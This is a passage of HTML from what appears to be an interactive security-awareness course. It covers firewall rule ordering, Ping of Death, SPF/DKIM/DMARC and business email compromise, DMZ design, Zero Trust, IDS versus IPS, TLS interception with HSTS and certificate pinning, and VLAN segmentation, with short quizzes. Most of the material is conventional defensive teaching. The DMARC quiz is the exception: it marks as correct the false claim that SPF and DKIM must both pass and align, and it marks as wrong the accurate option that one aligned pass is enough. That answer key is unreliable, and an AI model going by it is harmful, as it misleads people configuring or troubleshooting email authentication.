<div class="callout success"><span class="callout-icon">✅</span><div><strong>Correct Order (Least Privilege):</strong><br>Rule 1: DENY 185.x.x.0/24 (malicious range) ← Matched first<br>Rule 2: PERMIT specific_src → web_servers port 443 only<br>Rule 3: DENY ALL (implicit default deny)</div></div>\n\n  <div class="defense-grid">\n    <div class="defense-card">\n      <div class="dc-icon">📋</div>\n      <div class="dc-title">Deny Rules First</div>\n      <div class="dc-desc">Place specific deny/block rules before broad permit rules. Block lists must be above allow-all rules.</div>\n    </div>\n    <div class="defense-card">\n      <div class="dc-icon">🎯</div>\n      <div class="dc-title">Least Privilege Permits</div>\n      <div class="dc-desc">Replace "permit ANY to ANY" with specific source IP, destination IP, and port combinations that match only legitimate traffic.</div>\n    </div>\n    <div class="defense-card">\n      <div class="dc-icon">🔚</div>\n      <div class="dc-title">Implicit Deny All</div>\n      <div class="dc-desc">The final rule should always be "deny all" — ensuring any traffic not explicitly permitted is blocked by default.</div>\n    </div>\n  </div>\n\n  <div class="concepts-row">\n    <span class="concept-tag ct-amber">Rule Ordering</span>\n    <span class="concept-tag ct-red">First-Match</span>\n    <span class="concept-tag ct-blue">Port 443</span>\n    <span class="concept-tag ct-green">Least Privilege</span>\n    <span class="concept-tag ct-cyan">Firewall Policy</span>\n    <span class="concept-tag ct-green">Implicit Deny</span>\n  </div>\n\n  <div class="quiz-block">\n    <div class="quiz-header"><span class="quiz-header-icon">🧠</span><span class="quiz-header-title">Quick Check</span></div>\n    <div class="quiz-body">\n      <div class="quiz-question">In a top-down first-match firewall, a PERMIT ANY rule on port 443 appears before a DENY for a malicious IP. What happens when that malicious IP sends a port 443 packet?</div>\n      <div class="quiz-options">\n        <button class="quiz-opt" onclick="checkQ(this,''wrong'',''Both rules are evaluated and the most specific one wins.'')"><span class="opt-letter">A</span>Both rules are evaluated; the more specific deny rule takes precedence.</button>\n        <button class="quiz-opt" onclick="checkQ(this,''correct'',''✓ Correct! First-match means the PERMIT ANY rule is matched immediately. The firewall permits the packet and stops evaluating. The DENY rule for the malicious IP is never reached.'')"><span class="opt-letter">B</span>The PERMIT rule matches first — the packet is allowed. The DENY rule is never evaluated.</button>\n        <button class="quiz-opt" onclick="checkQ(this,''wrong'',''The firewall evaluates all rules and applies the last match.'')"><span class="opt-letter">C</span>The firewall evaluates all rules and applies the last matching rule (last-match).</button>\n        <button class="quiz-opt" onclick="checkQ(this,''wrong'',''The firewall detects the conflict and blocks by default.'')"><span class="opt-letter">D</span>When two rules conflict, the firewall defaults to blocking the traffic.</button>\n      </div>\n      <div class="quiz-feedback"></div>\n      <button class="quiz-reset-btn" onclick="resetQ(this)">↺ Try Again</button>\n    </div>\n  </div>\n</section>\n\n<!-- ══════════════════════════════════ T10 PING OF DEATH ══════════════════════════════════ -->\n<section class="topic-section" id="t10">\n  <div class="section-header">\n    <div class="section-num">// 10</div>\n    <div class="section-title-wrap">\n      <h2 class="section-title">Ping of Death — IP Fragmentation Overflow</h2>\n      <div class="section-meta">\n        <span class="smeta-tag ct-purple" style="border-color:rgba(180,127,255,0.3)">Legacy / Historical</span>\n        <span class="smeta-tag ct-red" style="border-color:rgba(255,79,107,0.3)">Buffer Overflow</span>\n      </div>\n    </div>\n  </div>\n\n  <div class="scenario-card">\n    <div class="scenario-text">Logs from <mark>HealthPlus</mark> show a host sending ICMP echo request packets of nearly <code>65,000 bytes</code> each to an external IP. The target host experiences crashes and reboots. The attack comes from a single machine.</div>\n  </div>\n\n  <div class="concept-block">\n    <div class="cb-label" style="color:var(--cyan)">The IP Fragmentation Vulnerability</div>\n    <div class="cb-body">\n      The maximum size of an IP packet is <strong>65,535 bytes</strong>. However, most network links have a much smaller <em>Maximum Transmission Unit (MTU)</em> — typically 1,500 bytes for Ethernet. Large packets are broken into <em>fragments</em> and reassembled by the receiver.<br><br>\n      In the <strong>Ping of Death</strong> attack, the attacker crafts ICMP fragments that, when reassembled, exceed 65,535 bytes. The receiving OS, trying to reassemble fragments into a buffer sized for the maximum legal packet size, experiences a <em>buffer overflow</em>. This corrupts adjacent memory — causing crashes, reboots, or kernel panics.<br><br>\n      <strong>Why it''s historical:</strong> Modern OS IP stacks validate the total assembled size during reassembly and discard illegal packets before they overflow any buffer.\n    </div>\n  </div>\n\n  <div class="concepts-row">\n    <span class="concept-tag ct-purple">Ping of Death</span>\n    <span class="concept-tag ct-red">ICMP</span>\n    <span class="concept-tag ct-amber">IP Fragmentation</span>\n    <span class="concept-tag ct-red">Buffer Overflow</span>\n    <span class="concept-tag ct-blue">MTU</span>\n    <span class="concept-tag ct-cyan">65535 bytes</span>\n    <span class="concept-tag ct-green">Patched OS</span>\n  </div>\n\n  <div class="quiz-block">\n    <div class="quiz-header"><span class="quiz-header-icon">🧠</span><span class="quiz-header-title">Quick Check</span></div>\n    <div class="quiz-body">\n      <div class="quiz-question">Why is the Ping of Death considered largely a historical attack?</div>\n      <div class="quiz-options">\n        <button class="quiz-opt" onclick="checkQ(this,''wrong'',''Modern firewalls block all ICMP traffic by default.'')"><span class="opt-letter">A</span>Modern firewalls block all ICMP traffic by default, preventing the packets from reaching hosts.</button>\n        <button class="quiz-opt" onclick="checkQ(this,''wrong'',''IPv6 does not support fragmentation at all.'')"><span class="opt-letter">B</span>IPv6 eliminated fragmentation entirely, removing the attack surface.</button>\n        <button class="quiz-opt" onclick="checkQ(this,''correct'',''✓ Correct! Modern operating systems validate the total reassembled packet size during fragment reassembly. If the total exceeds 65,535 bytes, the OS discards the fragments before they are written to a buffer — preventing the overflow.'')"><span class="opt-letter">C</span>Modern OS stacks validate total reassembled size and discard oversized fragments before overflow occurs.</button>\n        <button class="quiz-opt" onclick="checkQ(this,''wrong'',''Large ICMP packets are now fragmented at the ISP level.'')"><span class="opt-letter">D</span>ISPs now fragment all ICMP packets above 512 bytes before delivery, preventing oversized packets.</button>\n      </div>\n      <div class="quiz-feedback"></div>\n      <button class="quiz-reset-btn" onclick="resetQ(this)">↺ Try Again</button>\n    </div>\n  </div>\n</section>\n\n<!-- ══════════════════════════════════ T11 BEC / EMAIL AUTH ══════════════════════════════════ -->\n<section class="topic-section" id="t11">\n  <div class="section-header">\n    <div class="section-num">// 11</div>\n    <div class="section-title-wrap">\n      <h2 class="section-title">Business Email Compromise & SPF · DKIM · DMARC</h2>\n      <div class="section-meta">\n        <span class="smeta-tag ct-amber" style="border-color:rgba(255,181,71,0.3)">Email Spoofing</span>\n        <span class="smeta-tag ct-red" style="border-color:rgba(255,79,107,0.3)">Social Engineering</span>\n      </div>\n    </div>\n  </div>\n\n  <div class="scenario-card">\n    <div class="scenario-text">An employee at <mark>FinanceCorp</mark> receives an email appearing to be from the CEO requesting an urgent wire transfer. Email headers reveal the Return-Path is <code>ceo@financec0rp.com</code> (zero instead of ''o'') and the sending mail server IP is not in FinanceCorp''s SPF record.</div>\n  </div>\n\n  <div class="concept-block">\n    <div class="cb-label" style="color:var(--cyan)">The Email Authentication Trio</div>\n    <div class="cb-body">\n      Three DNS-based email authentication standards work together to prevent spoofing:<br><br>\n      <strong>SPF (Sender Policy Framework):</strong> A DNS TXT record listing all <em>IP addresses authorised to send email</em> for a domain. The receiving server checks if the sender IP is in the list. If not — SPF fails.<br><br>\n      <strong>DKIM (DomainKeys Identified Mail):</strong> The sending server adds a <em>cryptographic signature</em> using the domain''s private key. The receiving server retrieves the public key from DNS and verifies the signature. Tampering with the email breaks the signature.<br><br>\n      <strong>DMARC (Domain-based Message Authentication):</strong> A policy that ties SPF and DKIM together. It defines what to do when alignment fails: <em>none</em> (monitor only), <em>quarantine</em> (spam folder), or <em>reject</em> (block entirely). DMARC also sends aggregate reports back to the domain owner.\n    </div>\n  </div>\n\n  <div class="compare-table" style="width:100%">\n    <table class="compare-table">\n      <thead><tr><th>Mechanism</th><th>What It Checks</th><th>How It Works</th></tr></thead>\n      <tbody>\n        <tr><td class="td-label">SPF</td><td>Sending IP authorised?</td><td>DNS TXT record lists permitted IPs/ranges</td></tr>\n        <tr><td class="td-label">DKIM</td><td>Message integrity & origin</td><td>Cryptographic signature verified via DNS public key</td></tr>\n        <tr><td class="td-label">DMARC</td><td>SPF + DKIM alignment + policy</td><td>Instructs receiver what to do on failure (reject/quarantine)</td></tr>\n      </tbody>\n    </table>\n  </div>\n\n  <div class="concepts-row">\n    <span class="concept-tag ct-red">BEC</span>\n    <span class="concept-tag ct-amber">Email Spoofing</span>\n    <span class="concept-tag ct-green">SPF</span>\n    <span class="concept-tag ct-green">DKIM</span>\n    <span class="concept-tag ct-green">DMARC</span>\n    <span class="concept-tag ct-blue">Return-Path</span>\n    <span class="concept-tag ct-cyan">Domain Alignment</span>\n  </div>\n\n  <div class="quiz-block">\n    <div class="quiz-header"><span class="quiz-header-icon">🧠</span><span class="quiz-header-title">Quick Check</span></div>\n    <div class="quiz-body">\n      <div class="quiz-question">An email passes SPF but fails DKIM. What does DMARC do with a "reject" policy?</div>\n      <div class="quiz-options">\n        <button class="quiz-opt" onclick="checkQ(this,''wrong'',''DMARC passes the email because SPF passed.'')"><span class="opt-letter">A</span>DMARC passes the email because at least one check (SPF) passed.</button>\n        <button class="quiz-opt" onclick="checkQ(this,''wrong'',''DMARC sends the email to spam only if both checks fail.'')"><span class="opt-letter">B</span>DMARC sends to spam only when both SPF and DKIM fail simultaneously.</button>\n        <button class="quiz-opt" onclick="checkQ(this,''correct'',''✓ Correct! DMARC requires both SPF AND DKIM to pass AND align with the From: domain. A reject policy means the receiving server blocks delivery if either check fails alignment, regardless of the other passing.'')"><span class="opt-letter">C</span>DMARC rejects the email — both checks must pass AND align with the From: domain under a reject policy.</button>\n        <button class="quiz-opt" onclick="checkQ(this,''wrong'',''DMARC only monitors; enforcement is handled by SPF.'')"><span class="opt-letter">D</span>DMARC only monitors and reports — SPF is the only mechanism that can enforce rejection.</button>\n      </div>\n      <div class="quiz-feedback"></div>\n      <button class="quiz-reset-btn" onclick="resetQ(this)">↺ Try Again</button>\n    </div>\n  </div>\n</section>\n\n<!-- ══════════════════════════════════ T12 DMZ ══════════════════════════════════ -->\n<section class="topic-section" id="t12">\n  <div class="section-header">\n    <div class="section-num">// 12</div>\n    <div class="section-title-wrap">\n      <h2 class="section-title">DMZ Architecture — Dual-Firewall Design</h2>\n      <div class="section-meta">\n        <span class="smeta-tag ct-green" style="border-color:rgba(0,232,122,0.3)">Network Architecture</span>\n        <span class="smeta-tag ct-cyan" style="border-color:rgba(0,212,255,0.3)">Defence in Depth</span>\n      </div>\n    </div>\n  </div>\n\n  <div class="scenario-card">\n    <div class="scenario-text">A network architect is designing <mark>HealthPlus Hospital</mark>''s network. Patient-facing web portals must be reachable from the internet. The internal patient records database must <strong>never</strong> be directly accessible from outside. Compliance requires strict network isolation.</div>\n  </div>\n\n  <div class="concept-block">\n    <div class="cb-label" style="color:var(--cyan)">DMZ — Demilitarized Zone</div>\n    <div class="cb-body">\n      A <strong>DMZ</strong> is a network segment that sits between the public internet and the internal trusted network. It hosts services that must be internet-accessible (web servers, email gateways, DNS) while keeping internal resources isolated.<br><br>\n      The <strong>dual-firewall design</strong> uses two separate firewalls:<br>\n      — <em>External Firewall:</em> Sits between internet and DMZ. Permits only specific inbound protocols to DMZ servers (e.g. HTTPS on port 443).<br>\n      — <em>Internal Firewall:</em> Sits between DMZ and internal network. Permits only specific application-tier traffic (e.g. web server → database on port 3306). Denies ALL direct internet-to-internal traffic.\n    </div>\n  </div>\n\n  <div class="diagram-block">\n    <div class="diagram-label">Dual Firewall DMZ Architecture</div>\n    <div class="flow-row">\n      <div class="flow-node fn-attacker">Internet</div>\n      <div class="flow-arrow green">──HTTPS 443──▶</div>\n      <div class="flow-node fn-warn">External FW<br><small>Permits 443 to DMZ only</small></div>\n      <div class="flow-arrow green">──────▶</div>\n      <div class="flow-node fn-neutral">DMZ<br><small>Web Servers</small></div>\n    </div>\n    <div style="margin-top:12px;" class="flow-row">\n      <div class="flow-node fn-neutral">DMZ Web Server</div>\n      <div class="flow-arrow amber">──App traffic──▶</div>\n      <div class="flow-node fn-warn">Internal FW<br><small>Only app→DB allowed</small></div>\n      <div class="flow-arrow green">──TCP 3306──▶</div>\n      <div class="flow-node fn-server">Internal DB<br><small>Never internet-exposed</small></div>\n    </div>\n    <div style="margin-top:12px;" class="flow-row">\n      <div class="flow-node fn-attacker">Internet</div>\n      <div class="flow-arrow red">──Direct DB access──▶</div>\n      <div class="flow-node fn-warn">Internal FW</div>\n      <div class="flow-arrow red">──BLOCKED──✗</div>\n      <div class="flow-node fn-server">Internal DB</div>\n    </div>\n  </div>\n\n  <div class="callout success"><span class="callout-icon">🛡️</span><div><strong>Defence in Depth:</strong> Even if an attacker fully compromises a DMZ web server, they face a second firewall before reaching the patient records database. The internal firewall enforces the principle that no direct internet-to-internal traffic is permitted.</div></div>\n\n  <div class="concepts-row">\n    <span class="concept-tag ct-green">DMZ</span>\n    <span class="concept-tag ct-cyan">Dual Firewall</span>\n    <span class="concept-tag ct-blue">Defence in Depth</span>\n    <span class="concept-tag ct-amber">Security Zones</span>\n    <span class="concept-tag ct-green">Network Isolation</span>\n    <span class="concept-tag ct-purple">HTTPS</span>\n  </div>\n\n  <div class="quiz-block">\n    <div class="quiz-header"><span class="quiz-header-icon">🧠</span><span class="quiz-header-title">Quick Check</span></div>\n    <div class="quiz-body">\n      <div class="quiz-question">In a dual-firewall DMZ, what is the role of the INTERNAL firewall specifically?</div>\n      <div class="quiz-options">\n        <button class="quiz-opt" onclick="checkQ(this,''wrong'',''It blocks all traffic from the internet.'')"><span class="opt-letter">A</span>It filters all inbound internet traffic before it reaches the DMZ web servers.</button>\n        <button class="quiz-opt" onclick="checkQ(this,''correct'',''✓ Correct! The internal firewall is the second line of defence. It only allows specific application-tier traffic from the DMZ to internal resources (e.g., web server → DB). All direct internet-to-internal traffic is denied — even if the external firewall is bypassed.'')"><span class="opt-letter">B</span>It restricts traffic from the DMZ to the internal network — only specific app-tier communication is permitted.</button>\n        <button class="quiz-opt" onclick="checkQ(this,''wrong'',''It inspects and logs all SSL/TLS sessions.'')"><span class="opt-letter">C</span>It performs deep packet inspection on all SSL/TLS sessions entering the organisation.</button>\n        <button class="quiz-opt" onclick="checkQ(this,''wrong'',''It blocks outbound internet access from internal hosts.'')"><span class="opt-letter">D</span>Its primary role is preventing internal users from accessing the internet without VPN.</button>\n      </div>\n      <div class="quiz-feedback"></div>\n      <button class="quiz-reset-btn" onclick="resetQ(this)">↺ Try Again</button>\n    </div>\n  </div>\n</section>\n\n<!-- ══════════════════════════════════ T13 ZERO TRUST ══════════════════════════════════ -->\n<section class="topic-section" id="t13">\n  <div class="section-header">\n    <div class="section-num">// 13</div>\n    <div class="section-title-wrap">\n      <h2 class="section-title">Zero Trust Architecture & Lateral Movement</h2>\n      <div class="section-meta">\n        <span class="smeta-tag ct-green" style="border-color:rgba(0,232,122,0.3)">Security Architecture</span>\n        <span class="smeta-tag ct-blue" style="border-color:rgba(74,140,255,0.3)">East-West Traffic</span>\n      </div>\n    </div>\n  </div>\n\n  <div class="scenario-card">\n    <div class="scenario-text">A red team at <mark>LogixSoft</mark> gained initial access via phishing. All internal servers share one <strong>flat network</strong> with no internal firewalls. The team moved laterally across <mark>14 servers in 2 hours</mark>, reaching the crown jewel database with no alerts triggered.</div>\n  </div>\n\n  <div class="concept-block">\n    <div class="cb-label" style="color:var(--cyan)">Zero Trust — "Never Trust, Always Verify"</div>\n    <div class="cb-body">\n      Traditional security assumed the internal network was safe — once inside the perimeter, traffic was trusted. <strong>Zero Trust Architecture (ZTA)</strong> fundamentally rejects this: <em>no user, device, or workload is trusted by default, regardless of location</em>.<br><br>\n      Zero Trust focuses on <em>east-west (internal) traffic</em> — the movement between systems inside the network that flat architectures leave uncontrolled. Every access request must be continuously authenticated, authorised based on least privilege, and logged — even between internal servers.\n    </div>\n  </div>\n\n  <div class="defense-grid">\n    <div class="defense-card">\n      <div class="dc-icon">🔲</div>\n      <div class="dc-title">Micro-Segmentation</div>\n      <div class="dc-desc">Divide the network into granular zones — per-workload or per-application firewall policies. A compromised host cannot freely reach other segments.</div>\n    </div>\n    <div class="defense-card">\n      <div class="dc-icon">🔑</div>\n      <div class="dc-title">Identity-Based Access</div>\n      <div class="dc-desc">Mutual TLS (mTLS) or token-based authentication required even between internal services. Strong identity for every request.</div>\n    </div>\n    <div class="defense-card">\n      <div class="dc-icon">🛂</div>\n      <div class="dc-title">Privileged Access Mgmt (PAM)</div>\n      <div class="dc-desc">Least-privilege service accounts. Credentials are vaulted, rotated, and scoped to minimum necessary access. Compromised creds have limited blast radius.</div>\n    </div>\n    <div class="defense-card">\n      <div class="dc-icon">📡</div>\n      <div class="dc-title">Continuous Monitoring</div>\n      <div class="dc-desc">UEBA and SIEM monitor east-west traffic for anomalies. Lateral movement patterns (port scanning, unusual auth attempts) trigger alerts.</div>\n    </div>\n  </div>\n\n  <div class="concepts-row">\n    <span class="concept-tag ct-green">Zero Trust</span>\n    <span class="concept-tag ct-blue">Micro-Segmentation</span>\n    <span class="concept-tag ct-red">Lateral Movement</span>\n    <span class="concept-tag ct-amber">Flat Network</span>\n    <span class="concept-tag ct-cyan">East-West Traffic</span>\n    <span class="concept-tag ct-purple">PAM</span>\n    <span class="concept-tag ct-green">mTLS</span>\n  </div>\n\n  <div class="quiz-block">\n    <div class="quiz-header"><span class="quiz-header-icon">🧠</span><span class="quiz-header-title">Quick Check</span></div>\n    <div class="quiz-body">\n      <div class="quiz-question">What is "east-west traffic" and why is it specifically important in Zero Trust?</div>\n      <div class="quiz-options">\n        <button class="quiz-opt" onclick="checkQ(this,''wrong'',''Traffic between users and internet-facing services.'')"><span class="opt-letter">A</span>Traffic flowing from users to internet-facing services (north-south traffic).</button>\n        <button class="quiz-opt" onclick="checkQ(this,''wrong'',''Encrypted traffic between data centres and cloud providers.'')"><span class="opt-letter">B</span>Encrypted VPN tunnels connecting geographically separated data centres.</button>\n        <button class="quiz-opt" onclick="checkQ(this,''correct'',''✓ Correct! East-west traffic refers to internal traffic between servers, workloads, and services within the same network. Traditional perimeter security ignores this — once inside, anything could reach anything. Zero Trust enforces authentication and authorisation for ALL traffic including internal.'')"><span class="opt-letter">C</span>Traffic between internal servers and workloads — ignored by perimeter security but the primary lateral movement path.</button>\n        <button class="quiz-opt" onclick="checkQ(this,''wrong'',''Traffic from IoT devices to internal databases.'')"><span class="opt-letter">D</span>Specifically IoT-to-server traffic, which requires separate security policies.</button>\n      </div>\n      <div class="quiz-feedback"></div>\n      <button class="quiz-reset-btn" onclick="resetQ(this)">↺ Try Again</button>\n    </div>\n  </div>\n</section>\n\n<!-- ══════════════════════════════════ T14 IDS vs IPS ══════════════════════════════════ -->\n<section class="topic-section" id="t14">\n  <div class="section-header">\n    <div class="section-num">// 14</div>\n    <div class="section-title-wrap">\n      <h2 class="section-title">IDS vs IPS — Detection vs Prevention</h2>\n      <div class="section-meta">\n        <span class="smeta-tag ct-cyan" style="border-color:rgba(0,212,255,0.3)">Intrusion Detection / Prevention</span>\n      </div>\n    </div>\n  </div>\n\n  <div class="scenario-card">\n    <div class="scenario-text"><mark>Nexagen Corp</mark> deploys a system that sits <strong>inline</strong> on the network and automatically drops or resets malicious connections. A second team proposes a system that only monitors and generates alerts without taking action.</div>\n  </div>\n\n  <div class="compare-table" style="width:100%">\n    <table class="compare-table">\n      <thead><tr><th>Property</th><th>IDS — Intrusion Detection</th><th>IPS — Intrusion Prevention</th></tr></thead>\n      <tbody>\n        <tr><td class="td-label">Deployment</td><td>Out-of-band / SPAN port (passive)</td><td>Inline — all traffic passes through it</td></tr>\n        <tr><td class="td-label">Response</td><td>Detects and <strong>alerts only</strong></td><td>Detects and <strong>actively blocks/resets</strong></td></tr>\n        <tr><td class="td-label">Traffic Impact</td><td class="td-good">None — copy of traffic</td><td class="td-bad">Adds latency if system is overloaded</td></tr>\n        <tr><td class="td-label">False Positive Risk</td><td class="td-good">Low risk — only alerts</td><td class="td-bad">High risk — false positives block legit traffic</td></tr>\n        <tr><td class="td-label">Protection Speed</td><td class="td-bad">Requires human response</td><td class="td-good">Real-time automatic blocking</td></tr>\n      </tbody>\n    </table>\n  </div>\n\n  <div class="callout info"><span class="callout-icon">💡</span><div><strong>Best Practice:</strong> Deploy IDS first to tune detection rules with zero traffic impact. Once false positive rates are acceptable, transition to IPS on critical segments for automated enforcement. Many organisations run IDS on general segments, IPS on high-value segments (database tiers, payment systems).</div></div>\n\n  <div class="concepts-row">\n    <span class="concept-tag ct-cyan">IDS</span>\n    <span class="concept-tag ct-green">IPS</span>\n    <span class="concept-tag ct-amber">Inline vs Passive</span>\n    <span class="concept-tag ct-red">False Positive</span>\n    <span class="concept-tag ct-blue">SPAN Port</span>\n    <span class="concept-tag ct-purple">Signature Detection</span>\n  </div>\n\n  <div class="quiz-block">\n    <div class="quiz-header"><span class="quiz-header-icon">🧠</span><span class="quiz-header-title">Quick Check</span></div>\n    <div class="quiz-body">\n      <div class="quiz-question">Why is false positive tuning especially critical for IPS but less urgent for IDS?</div>\n      <div class="quiz-options">\n        <button class="quiz-opt" onclick="checkQ(this,''wrong'',''IPS uses more expensive hardware that is harder to tune.'')"><span class="opt-letter">A</span>IPS uses proprietary hardware that requires expensive vendor tuning contracts.</button>\n        <button class="quiz-opt" onclick="checkQ(this,''correct'',''✓ Correct! An IPS false positive actively BLOCKS legitimate traffic — potentially causing service outages, failed transactions, or broken applications. An IDS false positive only generates an alert, which a human analyst can investigate. The operational impact is fundamentally different.'')"><span class="opt-letter">B</span>An IPS false positive actively blocks legitimate traffic, causing outages. An IDS false positive only produces an alert.</button>\n        <button class="quiz-opt" onclick="checkQ(this,''wrong'',''IDS rules are based on AI and are self-tuning.'')"><span class="opt-letter">C</span>IDS rules use machine learning and automatically self-tune over time, unlike IPS.</button>\n        <button class="quiz-opt" onclick="checkQ(this,''wrong'',''IPS only inspects encrypted traffic where false positives are common.'')"><span class="opt-letter">D</span>IPS inspects encrypted traffic where detection is unreliable, creating more false positives.</button>\n      </div>\n      <div class="quiz-feedback"></div>\n      <button class="quiz-reset-btn" onclick="resetQ(this)">↺ Try Again</button>\n    </div>\n  </div>\n</section>\n\n<!-- ══════════════════════════════════ T15 TLS MitM ══════════════════════════════════ -->\n<section class="topic-section" id="t15">\n  <div class="section-header">\n    <div class="section-num">// 15</div>\n    <div class="section-title-wrap">\n      <h2 class="section-title">TLS Man-in-the-Middle & HSTS / Certificate Pinning</h2>\n      <div class="section-meta">\n        <span class="smeta-tag ct-red" style="border-color:rgba(255,79,107,0.3)">MitM Attack</span>\n        <span class="smeta-tag ct-green" style="border-color:rgba(0,232,122,0.3)">Cryptographic Defence</span>\n      </div>\n    </div>\n  </div>\n\n  <div class="scenario-card">\n    <div class="scenario-text">At a café, an attacker presents a <code>self-signed SSL certificate</code> to a user''s browser. The browser shows a certificate warning. The user clicks <mark>"proceed anyway."</mark> The attacker decrypts, reads, and re-encrypts all traffic including banking credentials.</div>\n  </div>\n\n  <div class="concept-block">\n    <div class="cb-label" style="color:var(--cyan)">TLS Interception Mechanism</div>\n    <div class="cb-body">\n      In a <strong>TLS MitM attack</strong>, the attacker performs <em>TLS termination</em> — establishing two separate TLS sessions: one with the victim (presenting a fake certificate) and one with the real server (forwarding the victim''s requests). The attacker decrypts, reads/modifies, then re-encrypts the traffic.<br><br>\n      The browser warning is the only signal — which is why the human factor is critical. Two technical controls can prevent interception <em>even if the user clicks through the warning</em>:\n    </div>\n  </div>\n\n  <div class="defense-grid">\n    <div class="defense-card">\n      <div class="dc-icon">🔒</div>\n      <div class="dc-title">HSTS — HTTP Strict Transport Security</div>\n      <div class="dc-desc">A server response header instructing browsers to <strong>only connect via HTTPS</strong> for a defined period. With preloading, browsers refuse invalid certificates with NO override option — the user cannot click through. The domain is baked into the browser''s preload list.</div>\n    </div>\n    <div class="defense-card">\n      <div class="dc-icon">📌</div>\n      <div class="dc-title">Certificate Pinning</div>\n      <div class="dc-desc">The application hardcodes the expected certificate or public key hash. Any certificate not matching — including the attacker''s — is rejected outright, even if it''s signed by a valid CA. Used in mobile apps and high-security web applications.</div>\n    </div>\n  </div>\n\n  <div class="concepts-row">\n    <span class="concept-tag ct-red">MitM</span>\n    <span class="concept-tag ct-red">TLS Interception</span>\n    <span class="concept-tag ct-amber">Self-Signed Cert</span>\n    <span class="concept-tag ct-green">HSTS</span>\n    <span class="concept-tag ct-green">Certificate Pinning</span>\n    <span class="concept-tag ct-blue">TLS Termination</span>\n    <span class="concept-tag ct-purple">Preload List</span>\n  </div>\n\n  <div class="quiz-block">\n    <div class="quiz-header"><span class="quiz-header-icon">🧠</span><span class="quiz-header-title">Quick Check</span></div>\n    <div class="quiz-body">\n      <div class="quiz-question">How does HSTS preloading prevent a TLS MitM attack even when a user ignores certificate warnings?</div>\n      <div class="quiz-options">\n        <button class="quiz-opt" onclick="checkQ(this,''wrong'',''HSTS encrypts the traffic with an additional layer.'')"><span class="opt-letter">A</span>HSTS adds an additional layer of encryption that the attacker cannot decrypt.</button>\n        <button class="quiz-opt" onclick="checkQ(this,''wrong'',''HSTS verifies the server IP matches the domain\\''s A record.'')"><span class="opt-letter">B</span>HSTS cross-checks the server IP address against the domain\\''s DNS A record before connecting.</button>\n        <button class="quiz-opt" onclick="checkQ(this,''correct'',''✓ Correct! With HSTS preloading, the domain is hardcoded into the browser — the browser enforces HTTPS and refuses any connection with an invalid certificate without providing an override option. There is no "proceed anyway" button for preloaded HSTS domains.'')"><span class="opt-letter">C</span>Preloaded HSTS domains have no bypass option — the browser hard-refuses invalid certs with no user override possible.</button>\n        <button class="quiz-opt" onclick="checkQ(this,''wrong'',''HSTS requires mutual TLS authentication from both parties.'')"><span class="opt-letter">D</span>HSTS enables mutual TLS requiring the client to present a certificate that the attacker cannot forge.</button>\n      </div>\n      <div class="quiz-feedback"></div>\n      <button class="quiz-reset-btn" onclick="resetQ(this)">↺ Try Again</button>\n    </div>\n  </div>\n</section>\n\n<!-- ══════════════════════════════════ T16 VLAN + ACL ══════════════════════════════════ -->\n<section class="topic-section" id="t16">\n  <div class="section-header">\n    <div class="section-num">// 16</div>\n    <div class="section-title-wrap">\n      <h2 class="section-title">Network Segmentation — VLANs & Inter-VLAN ACLs</h2>\n      <div class="section-meta">\n        <span class="smeta-tag ct-green" style="border-color:rgba(0,232,122,0.3)">Network Design</span>\n        <span class="smeta-tag ct-blue" style="border-color:rgba(74,140,255,0.3)">Least Privilege</span>\n      </div>\n    </div>\n  </div>\n\n  <div class="scenario-card">\n    <div class="scenario-text"><mark>RetailChain</mark> has all POS terminals, management workstations, and the HR system on the <strong>same flat network segment</strong>. An attacker who compromised one POS terminal can directly access the HR salary database with no additional obstacles.</div>\n  </div>\n\n  <div class="concept-block">\n    <div class="cb-label" style="color:var(--cyan)">VLAN Segmentation + Inter-VLAN ACLs</div>\n    <div class="cb-body">\n      <strong>VLANs</strong> partition a physical network into isolated Layer 2 broadcast domains. Hosts in different VLANs cannot communicate by default — they require a Layer 3 routing decision.<br><br>\n      <strong>Inter-VLAN ACLs</strong> (on a router or Layer 3 switch) control <em>which VLANs can communicate</em>, on which ports, and in which direction. This enforces least privilege at the network level — a POS terminal can only reach the payment processor on specific ports. It cannot reach HR systems at all.\n    </div>\n  </div>\n\n  <div class="diagram-block">\n    <div class="diagram-label">Segmented Architecture</div>\n    <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;">\n      <div class="flow-node fn-victim" style="padding:14px;border-radius:6px;">VLAN 10<br><small>POS Terminals</small><br><small style="color:var(--red)">→ Payment processor only</small></div>\n      <div class="flow-node fn-neutral" style="padding:14px;border-radius:6px;">VLAN 20<br><small>Management</small><br><small style="color:var(--muted)">→ Defined access w/ auth</small></div>\n      <div class="flow-node fn-server" style="padding:14px;border-radius:6px;">VLAN 30<br><small>HR / Corporate</small><br><small style="color:var(--green)">VLAN 10 → 30: BLOCKED</small></div>\n    </div>\n  </div>\n\n  <div class="concepts-row">\n    <span class="concept-tag ct-green">Network Segmentation</span>\n    <span class="concept-tag ct-blue">VLAN</span>\n    <span class="concept-tag ct-cyan">ACL</span>\n    <span class="concept-tag ct-amber">Flat Network</span>\n    <span class="concept-tag ct-green">Least Privilege</span>\n    <span class="concept-tag ct-purple">Inter-VLAN Routing</span>\n  </div>\n\n  <div class="quiz-block">\n    <div class="quiz-header"><span class="quiz-header-icon">🧠</span><span class="quiz-header-title">Quick Check</span></div>\n    <div class="quiz-body">\n      <div class="quiz-question">After VLAN segmentation is applied, what additional control ensures POS terminals (VLAN 10) cannot reach HR systems (VLAN 30)?</div>\n      <div class="quiz-options">\n        <button class="quiz-opt" onclick="checkQ(this,''wrong'',''VLAN isolation alone prevents all inter-VLAN communication.'')"><span class="opt-letter">A</span>VLANs by themselves provide complete isolation — no additional control is needed.</button>\n        <button class="quiz-opt" onclick="checkQ(this,''correct'',''✓ Correct! VLANs create Layer 2 isolation, but inter-VLAN routing is still possible at Layer 3. ACLs applied on the Layer 3 switch or router explicitly block VLAN 10 → VLAN 30 communication. Without ACLs, a router between VLANs would still route traffic between them.'')"><span class="opt-letter">B</span>Inter-VLAN ACLs on the Layer 3 switch explicitly deny routing between VLAN 10 and VLAN 30.</button>\n        <button class="quiz-opt" onclick="checkQ(this,''wrong'',''MAC address filtering on VLAN 10 blocks unauthorised destinations.'')"><span class="opt-letter">C</span>MAC address filtering on VLAN 10 switch ports prevents communication to HR systems.</button>\n        <button class="quiz-opt" onclick="checkQ(this,''wrong'',''VPN tunnels must be configured between VLANs to enforce isolation.'')"><span class="opt-letter">D</span>All inter-VLAN traffic must be routed through a VPN tunnel with authentication.</button>\n      </div>\n      <div class="quiz-feedback"></div>\n      <button class="quiz-reset-btn" 